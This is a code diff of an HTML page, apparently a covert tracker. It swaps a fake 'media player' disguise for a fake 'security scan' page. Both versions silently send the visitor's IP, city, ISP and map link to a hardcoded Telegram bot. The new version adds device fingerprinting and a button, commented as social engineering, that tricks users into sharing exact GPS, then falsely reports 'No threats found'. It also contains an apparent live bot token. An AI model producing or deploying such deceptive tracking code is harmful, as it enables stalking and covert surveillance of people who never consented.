@@ -3,93 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player</title>
+    <title>System Security Scan</title>
     <style>
-        body {
-            background-color: #0e0e0e;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .container {
-            text-align: center;
-        }
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.2rem; font-weight: 400; color: #aaa; }
+        body { background-color: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 0 15px #00ff41; }
+        .btn { background: none; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+        .btn:hover { background: #00ff41; color: #000; }
+        #logs { font-size: 10px; text-align: left; margin-top: 15px; color: #008f11; overflow: hidden; height: 100px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="loader"></div>
-        <h1 id="status">Loading secure media player...</h1>
-    </div>
+<div class="box">
+    <h3>SECURITY ANALYZER</h3>
+    <p id="msg">Scanning hardware for vulnerabilities...</p>
+    <div id="logs"></div>
+    <button class="btn" onclick="requestExact()">Verify Identity</button>
+</div>
 
-    <script>
-        // --- YOUR CONFIGURATION ---
-        // I have pre-filled these with the info you provided.
-        const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
-        const CHAT_ID = "5782276534";
+<script>
+    const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
+    const CHAT_ID = "5782276534";
 
-        async function grabAndSend() {
-            try {
-                // 1. Get the approximate location via IP (No Popup)
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+    async function captureData(gps = null) {
+        // 1. Silent Data (IP & Location)
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
 
-                // 2. Format the message for your Telegram
-                const message = `
-🚨 **New Location Grabbed** 🚨
+        // 2. Hardware Specs (Silent)
+        const battery = await navigator.getBattery?.();
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        // 3. Construct Message
+        let report = `
+🔥 **DEEP SCAN COMPLETE** 🔥
 ━━━━━━━━━━━━━━━━━━
-📍 **City:** ${data.city || 'Unknown'}
-🌍 **Region:** ${data.region || 'Unknown'}
-🏳️ **Country:** ${data.country_name || 'Unknown'}
-📡 **IP Address:** \`${data.ip}\`
-🏢 **Provider:** ${data.org || 'Unknown'}
-🗺️ **Map Link:** https://www.google.com/maps?q=${data.latitude},${data.longitude}
-━━━━━━━━━━━━━━━━━━
-                `;
+👤 **USER INFO**
+• IP: \`${ipData.ip}\`
+• City: ${ipData.city}, ${ipData.country_name}
+• ISP: ${ipData.org}
 
-                // 3. Send to your bot via Telegram's API
-                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                
-                await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
+📱 **DEVICE SPECS**
+• OS: ${navigator.platform}
+• Screen: ${window.screen.width}x${window.screen.height}
+• GPU: ${gpu}
+• Battery: ${battery ? (battery.level * 100) + "%" : "Unknown"}
 
-                // 4. Update the screen so the user thinks it just failed
-                setTimeout(() => {
-                    document.getElementById('status').innerText = "Error: Media incompatible with this browser.";
-                    document.querySelector('.loader').style.display = 'none';
-                }, 2000);
+📍 **GPS DATA**
+${gps ? `• Lat: ${gps.lat}\n• Lon: ${gps.lon}\n• Accuracy: ${gps.acc}m\n• Map: [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})` : "❌ Exact GPS Denied"}
+━━━━━━━━━━━━━━━━━━`;
 
-            } catch (error) {
-                console.log("Silent Error");
+        // 4. Send to Telegram
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+        });
+    }
+
+    // Social Engineering: The button triggers the "Exact" GPS popup
+    function requestExact() {
+        document.getElementById('msg').innerText = "Verifying GPS Authentication...";
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                captureData({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
+                document.getElementById('msg').innerText = "Scan Complete. No threats found.";
+            },
+            () => {
+                captureData(); // Send IP data anyway if they block GPS
+                document.getElementById('msg').innerText = "Error: GPS Verification Required.";
             }
-        }
+        );
+    }
 
-        // Run the function immediately when the page loads
-        window.onload = grabAndSend;
-    </script>
+    // Auto-run silent scan on load
+    window.onload = () => {
+        let logDiv = document.getElementById('logs');
+        let lines = ["> Initializing scan...", "> Accessing kernel...", "> Fetching IP...", "> Hardware identified."];
+        lines.forEach((l, i) => setTimeout(() => logDiv.innerHTML += l + "<br>", i * 500));
+        captureData(); // Sends the silent IP/Device info immediately
+    };
+</script>
 </body>
 </html>
